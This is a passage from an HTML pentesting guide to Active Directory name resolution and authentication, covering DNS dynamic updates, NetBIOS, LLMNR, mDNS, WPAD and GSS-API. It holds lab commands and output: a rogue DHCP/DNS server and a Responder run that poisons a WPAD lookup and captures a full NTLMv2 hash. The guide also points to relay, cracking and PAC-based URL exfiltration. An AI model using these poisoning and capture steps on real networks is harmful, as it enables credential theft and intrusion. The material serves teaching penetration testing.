</span></span><span style="display:flex;"><span>VERBOSE<span style="color:#960050;background-color:#1e0010">:</span> [+] Kerberos preauthentication successful
</span></span><span style="display:flex;"><span>VERBOSE<span style="color:#960050;background-color:#1e0010">:</span> [+] Kerberos TKEY query successful
</span></span><span style="display:flex;"><span>[+] DNS update successful
</span></span><span style="display:flex;"><span>PS C:\&gt; nslookup test
</span></span><span style="display:flex;"><span>Server<span style="color:#960050;background-color:#1e0010">:</span>  UnKnown
</span></span><span style="display:flex;"><span>Address<span style="color:#960050;background-color:#1e0010">:</span>  <span style="color:#ae81ff">192.168</span>.100.2
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Name<span style="color:#960050;background-color:#1e0010">:</span>    test.contoso.local
</span></span><span style="display:flex;"><span>Address<span style="color:#960050;background-color:#1e0010">:</span>  <span style="color:#ae81ff">192.168</span>.100.<span style="color:#ae81ff">100</span></span></span></code></pre></div>
</div>
<figcaption>
DNS update with Invoke-DNSUpdate
</figcaption>
</figure>
<p>
If you are wondering how DNS can allow authenticated requests, this is achieved by
using the <a href="https://www.ietf.org/rfc/rfc2845.txt">TSIG</a> (Transaction Signature) protocol, which requires the messages to
be signed with a shared key between server and the client. In the case of
Active Directory, this shared key is obtained by using the <a href="#kerberos">Kerberos</a> protocol.</p>
<p>
Back to the dynamic updates functionality, one interesting record to register is
the wildcard record, <code>*</code>. The wildcard record is used to specify a default IP
address that is used to resolve those queries that doesn't match any other
record. Pretty useful to <a href="https://blog.netspi.com/exploiting-adidns/">perform PitM attacks</a> if it is used to point to a
computer controlled by us. However, dynamic updates doesn't allow to register a
wildcard record due to errors in the character handling.</p>
<p>
Fortunately, since DNS records are stored in the Active Directory database,
they can be created/modify/deleted by using LDAP. We can play with DNS records
via LDAP with <a href="https://github.com/Kevin-Robertson/Powermad">Powermad</a> and <a href="https://github.com/dirkjanm/krbrelayx#dnstoolpy">dnstool.py</a>. This technique can also be employed to
recolect NetNTLM hashes with <a href="https://github.com/Kevin-Robertson/Inveigh">Inveigh</a>. However, it is important to remember to
delete the registered DNS records when finished in order to avoid causing
network problems.</p>
<p>
However, there are certain <a href="https://www.netspi.com/blog/technical/network-penetration-testing/adidns-revisited/">DNS names that are protected</a> by the DNS Global Query
Block List (GQBL) from being resolved even if you add a DNS record. By default
those are <code class="verbatim">wpad</code> and <code class="verbatim">isatap</code>.</p>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\&gt; Get-DnsServerGlobalQueryBlockList
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Enable <span style="color:#960050;background-color:#1e0010">:</span> True
</span></span><span style="display:flex;"><span>List   <span style="color:#960050;background-color:#1e0010">:</span> {wpad, isatap}</span></span></code></pre></div>
</div>
<figcaption>
Get DNS Global Query Block List
</figcaption>
</figure>
<p>
For more information about dynamic updates and the related attacks, you can
check the following resources:</p>
<ul>
<li><a href="https://blog.netspi.com/exploiting-adidns/">Beyond LLMNR/NBNS Spoofing - Exploiting Active Directory-Integrated DNS</a></li>
<li><a href="https://blog.netspi.com/adidns-revisited/">ADIDNS Revisited - WPAD, GQBL, and More</a></li>
</ul>
</div>
</div>
</div>
</div>
<div id="outline-container-netbios" class="outline-3">
<h3 id="netbios">
NetBIOS
</h3>
<div id="outline-text-netbios" class="outline-text-3">
<p>
<a href="https://en.wikipedia.org/wiki/NetBIOS">NetBIOS</a> (Network Basic Input/Output System) is an OSI Session Layer 5
Protocol (and it is not related with the computer BIOS). It was developed in
1983 to allow applications in the same LAN (Local Area Network) to communicate
between them. NetBIOS became very popular and used by many different
applications, however, it was not able to communicate them on different
networks. Therefore, in 1987, the <a href="https://en.wikipedia.org/wiki/NetBIOS_over_TCP/IP">NBT</a> (NetBIOS over TCP/IP) protocol was created
(<a href="https://tools.ietf.org/html/rfc1001">RFC 1001</a> and <a href="https://tools.ietf.org/html/rfc1002">RFC 1002</a>) to make NetBIOS work over TCP and UDP protocols and
allow applications that used NetBIOS to communicate over internet.</p>
<p>
It is divided in three services, one, the NetBIOS <strong>Name Service</strong>, used for
resolving the NetBIOS names, and two services, NetBIOS <strong>Datagram and Session</strong>,
for transporting messages (similar to TCP and UDP).</p>
<figure>
<pre class="example">                       .-----
                       |
     .------.        .---
     | NBNS |--UDP--&gt;| 137
     '------'        '---
                       |   
    .-------.        .---
    | NBDGM |--UDP--&gt;| 138
    '-------'        '---
                       |
    .-------.        .---
    | NBSSN |--TCP--&gt;| 139
    '-------'        '---
                       |
                       '-----
</pre>
<figcaption>
NetBIOS ports
</figcaption>
</figure>
<div id="outline-container-netbios-datagram-service" class="outline-4">
<h4 id="netbios-datagram-service">
NetBIOS Datagram Service
</h4>
<div id="outline-text-netbios-datagram-service" class="outline-text-4">
<p>
The NetBIOS Datagram Service or NetBIOS-DGM or NBDGM is similar to UDP. It is
used as transport layer for application protocols that requires a connectionless
communication. The server will be listening in the UDP port 138. </p>
</div>
</div>
<div id="outline-container-netbios-session-service" class="outline-4">
<h4 id="netbios-session-service">
NetBIOS Session Service
</h4>
<div id="outline-text-netbios-session-service" class="outline-text-4">
<p>
The NetBIOS Session Service or NetBIOS-SSN or NBSSN is similar to TCP. It can be
used as transport for connected-oriented communications. It uses the 139/TCP
port.</p>
</div>
</div>
<div id="outline-container-netbios-name-service" class="outline-4">
<h4 id="netbios-name-service">
NetBIOS Name Service
</h4>
<div id="outline-text-netbios-name-service" class="outline-text-4">
<p>
From a pentest perspective, maybe the most interesting NetBIOS service is
NBNS (NetBIOS Name Service) that listens in the port 137/UDP. This service
allows to:</p>
<ul>
<li>Resolve NetBIOS name to an IP address</li>
<li>Known the status of a NetBIOS node</li>
<li>Register/Release a NetBIOS name</li>
</ul>
<p>The NetBIOS names, in contrast with the DNS names, are not hierarchical, and
only work in the local network. These names are made up of 16 bytes, where the
first 15 bytes are used to store the name, in uppercase letters, and last byte
indicates the type of the resource that has the name, which can be a hostname,
domain name, a file service, etc. To watch the NetBIOS names of the local
Windows machine, you can use the <code>nbtstat -n</code> command.</p>
<figure>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>C:\Users\Anakin&gt;nbtstat -n
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Ethernet 2:
</span></span><span style="display:flex;"><span>Node IpAddress: [192.168.100.10] Scope Id: []
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                NetBIOS Local Name Table
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>       Name               Type         Status
</span></span><span style="display:flex;"><span>    ---------------------------------------------
</span></span><span style="display:flex;"><span>    WS01-10        &lt;20&gt;  UNIQUE      Registered
</span></span><span style="display:flex;"><span>    WS01-10        &lt;00&gt;  UNIQUE      Registered
</span></span><span style="display:flex;"><span>    CONTOSO        &lt;00&gt;  GROUP       Registered</span></span></code></pre></div>
</div>
<figcaption>
NetBIOS names of local computer
</figcaption>
</figure>
<p>
As we can see, several names of different types are shown. In order to identify
them you can use the following table that contains the most common names, but
<a href="https://web.archive.org/web/20031010135027/http://www.neohapsis.com:80/resources/wins.htm#sec2">there are many more</a>.</p>
<figure>
<table>
<thead>
<tr>
<th class="align-right">Number</th>
<th>Type</th>
<th>Usage</th>
</tr>
</thead>
<tbody>
<tr>
<td class="align-right">00</td>
<td>UNIQUE</td>
<td>Hostname</td>
</tr>
<tr>
<td class="align-right">00</td>
<td>GROUP</td>
<td>Domain name</td>
</tr>
<tr>
<td class="align-right">01</td>
<td>GROUP</td>
<td>Master Browser</td>
</tr>
<tr>
<td class="align-right">1D</td>
<td>UNIQUE</td>
<td>Master Browser</td>
</tr>
<tr>
<td class="align-right">1E</td>
<td>GROUP</td>
<td>Browser service</td>
</tr>
<tr>
<td class="align-right">20</td>
<td>UNIQUE</td>
<td>File server</td>
</tr>
</tbody>
</table>
<figcaption>
NetBIOS name types
</figcaption>
</figure>
<p>
The NBNS protocol was implemented by Microsoft as <a href="https://web.archive.org/web/20031010135027/http://www.neohapsis.com:80/resources/wins.htm#sec4sub4sub4">WINS</a> (Windows Internet Name
Service). In a network, each Windows computer has a WINS database that stores
the available network resources, as well as its netbios and domain (or
workgroup) name. Moreover, a WINS server can also be setup, that works like a
DNS server with NetBIOS names.</p>
<p>
Therefore, in order to resolve a NetBIOS name there are two available
strategies. The first one is to query to the WINS server to resolve the name. If
this is not possible, then the query can be sent to the IP broadcast address,
waiting for the answer from the target computer. A NBNS name resolution is
performed when a NetBIOS name is used to connect to another machine, for
example, in a command such as <code>net view \\name</code>. In Linux machines is possible
to use the <a href="https://www.samba.org/samba/docs/current/man-html/nmblookup.1.html">nmblookup</a> utility to resolve NetBIOS names.</p>
<figure>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span># nmblookup ws01-10
</span></span><span style="display:flex;"><span>192.168.100.10 ws01-10&lt;00&gt;</span></span></code></pre></div>
</div>
<figcaption>
nmblookup resolution
</figcaption>
</figure>
<p>
It must be noted that, in case of a broadcast request, any computer can respond
to the query, so it allows to an attacker to impersonate the real computer. This
is one of the tactics followed by <a href="https://github.com/lgandx/Responder">responder.py</a> and <a href="https://github.com/Kevin-Robertson/Inveigh">Inveigh</a> to collect NTLM
hashes.</p>
<p>
Also, it must taked into account that NBNS is not used if any other protocol can
resolve the name request. The order of preference is the following:</p>
<ol>
<li>DNS</li>
<li>mDNS</li>
<li>LLMNR</li>
<li>NBNS</li>
</ol>
<p>Additionally, in case of knowing the IP of a NetBIOS node, you can ask it about its
services. In a Windows machine this can be done with the <a href="https://docs.microsoft.com/es-es/windows-server/administration/windows-commands/nbtstat">nbtstat</a> command.</p>
<figure>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>C:\Users\Anakin&gt;nbtstat -A 192.168.100.4
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Ethernet 2:
</span></span><span style="display:flex;"><span>Node IpAddress: [192.168.100.3] Scope Id: []
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>           NetBIOS Remote Machine Name Table
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>       Name               Type         Status
</span></span><span style="display:flex;"><span>    ---------------------------------------------
</span></span><span style="display:flex;"><span>    WS02-7         &lt;00&gt;  UNIQUE      Registered
</span></span><span style="display:flex;"><span>    CONTOSO        &lt;00&gt;  GROUP       Registered
</span></span><span style="display:flex;"><span>    WS02-7         &lt;20&gt;  UNIQUE      Registered
</span></span><span style="display:flex;"><span>    CONTOSO        &lt;1E&gt;  GROUP       Registered
</span></span><span style="display:flex;"><span>    CONTOSO        &lt;1D&gt;  UNIQUE      Registered
</span></span><span style="display:flex;"><span>    ☺☻__MSBROWSE__☻&lt;01&gt;  GROUP       Registered
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    MAC Address = 52-54-00-A4-8C-F2</span></span></code></pre></div>
</div>
<figcaption>
Resolving hostname and services with ntbstat
</figcaption>
</figure>
<p>
In the nbstat output you can see the hostname, the domain (or workgroup) name,
and several services of the machine, specified by the type. You can check the
meaning of type column in <a href="https://web.archive.org/web/20031010135027/http://www.neohapsis.com:80/resources/wins.htm#sec2">this table</a>.</p>
<p>
Furthermore, it is possible to use this capability to perform a NetBIOS scan in
a network and discover machines and services. This can be accomplished with
<a href="http://www.unixwiz.net/tools/nbtscan.html">nbtscan</a> or nmap script <a href="https://nmap.org/nsedoc/scripts/nbstat.html">nbtstat.nse</a>, from both Windows or Linux.</p>
<figure>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>root@debian10:~# nbtscan 192.168.100.0/24
</span></span><span style="display:flex;"><span>192.168.100.2   CONTOSO\DC01                    SHARING DC
</span></span><span style="display:flex;"><span>192.168.100.7   CONTOSO\WS02-7                  SHARING
</span></span><span style="display:flex;"><span>*timeout (normal end of scan)</span></span></code></pre></div>
</div>
<figcaption>
NetBIOS scan with nbtscan
</figcaption>
</figure>
<blockquote>
<p>In case you are connected to the network through proxychains, this won't
work since proxychains doesn't redirect UDP connections.</p>
</blockquote>
<p>
Moreover, NBNS also allows to NetBIOS nodes to register and release their
names. When a node is connected to the network, it sends a registration message
to the WINS server, or if this not possible, a broadcast message. Also, when the
node leave the network it should send a message to release the name, what doesn't
usually happen.</p>
<p>
It should be note that NBNS/WINS is considered a legacy protocol so its use <a href="https://docs.microsoft.com/en-us/windows-server/networking/technologies/wins/wins-top">is
discouraged</a>. However, it can be still found working in many Windows networks,
since it is enabled by default for compatibility reasons.</p>
</div>
</div>
</div>
</div>
<div id="outline-container-llmnr" class="outline-3">
<h3 id="llmnr">
LLMNR
</h3>
<div id="outline-text-llmnr" class="outline-text-3">
<p>
<a href="https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution">LLMNR</a> (Link-Local Multicast Name Resolution) is a descentralized application
protocol similar to DNS that allows to resolve hostnames in the same local
network, which means that its packets are not forwarded by routers and are only
transmited in their network segment. It is included in Windows since Windows
Vista, and is the third preferred method to resolve names. The order of
preference is the following:</p>
<ol>
<li>DNS</li>
<li>mDNS</li>
<li>LLMNR</li>
<li>NBNS</li>
</ol>
<p>In a Windows network, the computers are listening into the port 5355/UDP and to
resolve a name, the client sends a LLMNR query to the <a href="https://en.wikipedia.org/wiki/Multicast_address">multicast address</a> 224.0.0.252
(FF02:0:0:0:0:0:1:3 in IPv6). The queries follow the DNS format and can be use
to ask not only for names, but also any other question supported by DNS.</p>
<figure>
<pre class="example">            .---
 LLMNR ---&gt; | 5355/UDP
            '---
</pre>
<figcaption>
LLMNR port
</figcaption>
</figure>
<p>
The common case is use LLMNR to resolve names in local link by sending A DNS
queries. In this case, the computer that has the queried name should
response. But, of course, the query can be responded by anyone, even by an attacker
to perform a PitM attack. This is one of the tactics used by <a href="https://github.com/lgandx/Responder">responder.py</a>
and <a href="https://github.com/Kevin-Robertson/Inveigh">Inveigh</a> to recollect NTLM hashes in networks with Windows machines.</p>
</div>
</div>
<div id="outline-container-mdns" class="outline-3">
<h3 id="mdns">
mDNS
</h3>
<div id="outline-text-mdns" class="outline-text-3">
<p>
<a href="https://en.wikipedia.org/wiki/Multicast_DNS">mDNS</a> (multicast DNS) is a descentralized application protocol, similar to LLMNR,
based on DNS that allows to resolve names in local networks, which means that
its packets are not forwarded by routers and are only transmited in their
network segment. It is included in Windows 10, and is the second preferred
method to resolve names after <a href="#dns">DNS</a>.</p>
<ol>
<li>DNS</li>
<li>mDNS</li>
<li>LLMNR</li>
<li>NBNS</li>
</ol>
<p>In a Windows network, the computers are listening into the port 5353/UDP and to
resolve a name, the client sends a mDNS query to the <a href="https://en.wikipedia.org/wiki/Multicast_address">multicast address</a> 224.0.0.251
(FF02::FB in IPv6). The queries follow the DNS format and can be use
to ask not only for names, but also any other question supported by DNS.</p>
<figure>
<pre class="example">            .---
 mDNS ---&gt; | 5353/UDP
            '---
</pre>
<figcaption>
mDNS port
</figcaption>
</figure>
<p>
The common case is use mDNS to resolve names in local link by sending A DNS
queries. In this case, the computer that has the queried name should
response by sending the answer to the multicast address 224.0.0.251, this way,
any computer in the network can obtain the answer and cache it. But, of course,
the query can be responded by anyone, even an attacker to perform a MITM
attack. This is one of the tactics used by <a href="https://github.com/lgandx/Responder">responder.py</a> and <a href="https://github.com/Kevin-Robertson/Inveigh">Inveigh</a> to recollect
NetNTLM hashes in networks with Windows machines.</p>
</div>
</div>
<div id="outline-container-wpad" class="outline-3">
<h3 id="wpad">
WPAD
</h3>
<div id="outline-text-wpad" class="outline-text-3">
<p>
The <a href="https://en.wikipedia.org/wiki/Web_Proxy_Auto-Discovery_Protocol">WPAD</a> (Web Proxy Auto-Discovery) is a protocol for browsers to get
dynamically a file that indicates the proxies they should use. The file
indicating the proxies is a <a href="https://docs.microsoft.com/en-us/internet-explorer/ie11-ieak/proxy-auto-config-examples">PAC</a> (Proxy Auto-Config) javascript file that
contains a <code>FindProxyForURL</code> function that is invoked by browsers when they
navigate to a site.</p>
<figure>
<div class="src src-javascript">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">FindProxyForURL</span>(<span style="color:#a6e22e">url</span>, <span style="color:#a6e22e">host</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">host</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">"example.com"</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">"PROXY proxy:80"</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">"DIRECT"</span>;
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
</div>
<figcaption>
PAC file example
</figcaption>
</figure>
<p>
Even if the WPAD protocol is not used by default, it can be found in enterprise
environments, since many companies use proxies to watch its traffic. WPAD can be
configured in browsers or system settings, or even by <a href="https://tektab.com/2012/09/26/setting-up-web-proxy-autodiscovery-protocol-wpad-using-dns/">using a GPO</a>.</p>
<p>
To find the PAC, the browsers usually look for it in
<code class="verbatim">http://wpad.&lt;domain&gt;/wpad.dat</code>. Another URL can also be set by <a href="#dhcp">DHCP</a>.</p>
<p>
In order to resolve the <code class="verbatim">wpad.&lt;domain&gt;</code> the OS send a DNS request. In the
past, Windows machines use to send also an LLMNR or NetBIOS request if DNS fails,
but since <a href="https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2016/ms16-077">MS16-077</a> security update, the broadcast resolution of WPAD is disabled.</p>
<p>
Moreover, you cannot create the <code class="verbatim">wpad</code> DNS record by using DNS dynamic updates
through DNS or DHCP, or directly with LDAP. This is because is protected by the
<a href="https://www.netspi.com/blog/technical/network-penetration-testing/adidns-revisited/">Global Query Block List</a> (GQBL).</p>
<p>
So, even if in the past this attack was very popular, today your better chance
is to configure a malicious DNS server in the victim, by using DHCP or manually
to resolve <code class="verbatim">wpad</code> to your host.</p>
<figure>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>$ sudo dhcplayer server -I eth2 -v --domain contoso.local
</span></span><span style="display:flex;"><span>INFO - IP pool: 192.168.100.1-192.168.100.254
</span></span><span style="display:flex;"><span>INFO - Mask: 255.255.255.0
</span></span><span style="display:flex;"><span>INFO - Broadcast: 192.168.100.255
</span></span><span style="display:flex;"><span>INFO - DHCP: 192.168.100.44
</span></span><span style="display:flex;"><span>INFO - DNS: [192.168.100.44]
</span></span><span style="display:flex;"><span>INFO - Router: [192.168.100.44]
</span></span><span style="display:flex;"><span>INFO - Domain: contoso.local
</span></span><span style="display:flex;"><span>INFO - DISCOVER from 52:54:00:76:87:bb (ws01-10)
</span></span><span style="display:flex;"><span>INFO - Offer 192.168.100.121
</span></span><span style="display:flex;"><span>INFO - REQUEST from 52:54:00:76:87:bb (ws01-10)
</span></span><span style="display:flex;"><span>INFO - Requested IP 192.168.100.121
</span></span><span style="display:flex;"><span>INFO - ACK to 192.168.100.121 for 52:54:00:76:87:bb</span></span></code></pre></div>
</div>
<figcaption>
Configure a fake DNS server from DHCP
</figcaption>
</figure>
<p>
Additionally, it seems that <a href="https://pentest.blog/what-is-llmnr-wpad-and-how-to-abuse-them-during-pentest/">in the past it was possible to ask for basic HTTP
authentication</a> in the wpad request. However, I tried with different browsers
(IE, Edge, Firefox and Chrome) but I was unable to make it work. Only when NTLM
was required (using responder.py) the victim browser downloads the wpad file. </p>
<figure>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>$ sudo responder -I eth2 -wF                                                                                                                               1 ⨯
</span></span><span style="display:flex;"><span>                                         __
</span></span><span style="display:flex;"><span>  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
</span></span><span style="display:flex;"><span>  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
</span></span><span style="display:flex;"><span>  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
</span></span><span style="display:flex;"><span>                   |__|
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>           NBT-NS, LLMNR &amp; MDNS Responder 3.0.6.0
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
</span></span><span style="display:flex;"><span>  To kill this script hit CTRL-C
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[+] Poisoners:
</span></span><span style="display:flex;"><span>    LLMNR                      [ON]
</span></span><span style="display:flex;"><span>    NBT-NS                     [ON]
</span></span><span style="display:flex;"><span>    DNS/MDNS                   [ON]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[+] Servers:
</span></span><span style="display:flex;"><span>    HTTP server                [ON]
</span></span><span style="display:flex;"><span>    HTTPS server               [ON]
</span></span><span style="display:flex;"><span>    WPAD proxy                 [ON]
</span></span><span style="display:flex;"><span>    Auth proxy                 [OFF]
</span></span><span style="display:flex;"><span>.......
</span></span><span style="display:flex;"><span>[+] Poisoning Options:
</span></span><span style="display:flex;"><span>    Analyze Mode               [OFF]
</span></span><span style="display:flex;"><span>    Force WPAD auth            [ON]
</span></span><span style="display:flex;"><span>    Force Basic Auth           [OFF]
</span></span><span style="display:flex;"><span>    Force LM downgrade         [OFF]
</span></span><span style="display:flex;"><span>    Fingerprint hosts          [OFF]
</span></span><span style="display:flex;"><span>.......
</span></span><span style="display:flex;"><span>[+] Listening for events...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[*] [DNS] A Record poisoned answer sent to: 192.168.100.121  Requested name: .wpad.contoso.local
</span></span><span style="display:flex;"><span>[HTTP] User-Agent        : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Edg/90.0.818.66
</span></span><span style="display:flex;"><span>[HTTP] User-Agent        : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Edg/90.0.818.66
</span></span><span style="display:flex;"><span>[HTTP] User-Agent        : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Edg/90.0.818.66
</span></span><span style="display:flex;"><span>[HTTP] User-Agent        : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Edg/90.0.818.66
</span></span><span style="display:flex;"><span>[HTTP] NTLMv2 Client   : 192.168.100.121
</span></span><span style="display:flex;"><span>[HTTP] NTLMv2 Username : CONTOSO\anakin
</span></span><span style="display:flex;"><span>[HTTP] NTLMv2 Hash     : anakin::CONTOSO:bab86818f6898114:4E4B01D6F205A8BAED8383384C34E4BB:0101000000000000342A94C0D853D7018430129FD734A90600000000020008004E0032003200360001001E00570049004E002D003900330034004C0048004600510045004B0044004800040014004E003200320036002E004C004F00430041004C0003003400570049004E002D003900330034004C0048004600510045004B00440048002E004E003200320036002E004C004F00430041004C00050014004E003200320036002E004C004F00430041004C000800300030000000000000000100000000200000F160EE2502E164FA02569EF7A5CFA08BC2C34A7C4843E74A8E6E5A4683CF1EEA0A001000000000000000000000000000000000000900120048005400540050002F0077007000610064000000000000000000
</span></span><span style="display:flex;"><span>[HTTP] WPAD (auth) file sent to 192.168.100.121</span></span></code></pre></div>
</div>
<figcaption>
Serve WPAD file from Responder with NTLM auth
</figcaption>
</figure>
<p>
Apart from getting the <a href="#ntlm-hashes-cracking">NTLM hash to crack</a>, this could be useful for <a href="#ntlm-relay">NTLM relay</a>
attacks, since the HTTP doesn't required sign in NTLM and therefore it can be
used with any other protocol in NTLM cross-protocol relay attack. </p>
<p>
Moreover, to serve the PAC file to the victim will allow you to execute some
javascript code as the victim, which could be used to <a href="https://www.blackhat.com/docs/us-16/materials/us-16-Kotler-Crippling-HTTPS-With-Unholy-PAC.pdf">exfiltrate the visited
URLs</a>.</p>
</div>
</div>
</div>
</div>
<div id="outline-container-authentication" class="outline-2">
<h2 id="authentication">
Authentication
</h2>
<div id="outline-text-authentication" class="outline-text-2">
<p>
A critical point to understand many of the Active Directory attacks is to
understand how authentication works in Active Directory. But before digging into
the technical details, let's make a quick summary.</p>
<p>
In Active Directory there are two network authentication protocols available:
<a href="#ntlm">NTLM</a> and <a href="#kerberos">Kerberos</a>. Any of them can be used to authenticate domain users, but
Kerberos is the preferred option for this case, however only NTLM can be used to
authenticate local computer users.</p>
<p>
Since any of them can be used, how the client and server agree on the
authentication protocol to be used? They use a negotiation mechanism called
<a href="#spnego">SPNEGO</a>. With SPNEGO, they can indicate the protocols that are acceptable for
them.</p>
<figure>
<img src="./spnego_negtokeninit2.png" alt="./spnego_negtokeninit2.png" title="./spnego_negtokeninit2.png"><figcaption>
SPNEGO negotiation
</figcaption>
</figure>
<p>
The protocols negotiated with SPNEGO must be compatible with the <a href="#gss-api">GSS-API</a>
programming interface, allowing the client and server programs to use them in a
transparent way.</p>
<p>
But it also must be taken into account that authentication protocols are not
only to being used to remote logons, but also for local logons, since the
computers need to authenticate the domain users against the Domain Controllers
(usually by asking a Kerberos ticket). There are different <a href="#logon-types">logon types</a> in
Windows machines and they should be considered by a pentester, since many of
them cache the user credentials in the lsass process or store the passwords in
the LSA Secrets.</p>
<p>
So let's review these topics.</p>
<div id="outline-container-gss-api" class="outline-3">
<h3 id="gss-api">
GSS-API/SSPI
</h3>
<div id="outline-text-gss-api" class="outline-text-3">
<p>
<a href="https://en.wikipedia.org/wiki/Generic_Security_Services_Application_Program_Interface">GSS-API</a> (Generic Security Service Application Program Interface) is an
application programming interface that defines procedures and types that can be
implemented by security packages in order to provide authentication (not
authorization) in a uniformed way. Is defined in <a href="https://tools.ietf.org/html/rfc2743">RFC 2743</a>.</p>
<p>
The procedures and types for C programming language are defined in <a href="https://tools.ietf.org/html/rfc2744">RFC 2744</a>. 
Thus, a library GSS-API compatible implements those methods and types. For
example, the <a href="https://web.mit.edu/kerberos/krb5-1.12/doc/appdev/gssapi.html">MIT Kerberos</a> library can be used by calling the GSS-API procedures
instead of directly calling the Kerberos procedures. Some of the GSS-API
procedures are:</p>
<ul>
<li>gss_acquire_cred: Returns a handle for credentials.</li>
<li>gss_init_sec_context: Initiates a security context to be used with a peer.</li>
<li>gss_accept_sec_context: Accepts the security context initiated by a peer.</li>
</ul>
<p>Furthermore, GSS-API also helps to maintain the integrity and confidentiality of
a communication. GSS-API includes procedures to calculate/verify a MIC (Message
Integrity Code) for a message, as well as to encrypt/decrypt the content. The
related procedures are the following:</p>
<ul>
<li>gss_get_mic: Calculate the MIC (Message Integrity Code) for a message.</li>
<li>gss_verify_mic: Check the MIC to verify the message integrity.</li>
<li>gss_wrap: Attach MIC to a message and optionally encrypt the message
content.</li>
<li>gss_unwrap: Verify the MIC and decrypt the message content.</li>
</ul>
<p>This way, an user application can use different security libraries by just
calling the GSS-API procedures, without changing the code for each library. For
example, a program could use both Kerberos and NTLM authentication through
GSS-API.</p>
<figure>
<pre class="example">                     .---------------------------.
                     |   Kerberos Library        |
                     .---            .----       |
               .---&gt; | GSS-API  ---&gt; | Kerberos  |
               |     '---            '----       |
               |     |                           |
 .---------.   |     '---------------------------'
 |  user   |---|
 | program |   |     .---------------------------.
 '---------'   |     |       NTLM  Library       |
               |     .---            .----       |
               '---&gt; | GSS-API  ---&gt; | NTLM      |
                     '---            '----       |
                     |                           |
                     '---------------------------'
</pre>
<figcaption>
Program that can use Kerberos or NTLM authentication
</figcaption>
</figure>
<p>
Many different services in Windows uses the GSS-API in order to provide
authentication through Kerberos or NTLM. Notwithstanding, Kerberos is not
available in Workgroups, only in Active Directory, since is a centralized
authentication protocol.</p>
<p>
Windows uses <a href="https://docs.microsoft.com/en-us/windows/win32/secauthn/sspi">SSPI</a> (Security Support Provider Interface), which is a
Microsoft propietary variant of GSS-API with some extensions. In fact, many
functions of SSPI are equivalent to GSS-API functions, like the following:</p>
<figure>
<table>
<thead>
<tr>
<th>SSPI</th>
<th>GSS-API</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://docs.microsoft.com/en-us/windows/win32/secauthn/acquirecredentialshandle--general">AcquireCredentialsHandle</a></td>
<td>gss_acquire_cred</td>
</tr>
<tr>
<td><a href="https://docs.microsoft.com/en-us/windows/win32/secauthn/initializesecuritycontext--general">InitializeSecurityContext</a></td>
<td>gss_init_sec_context</td>
</tr>
<tr>
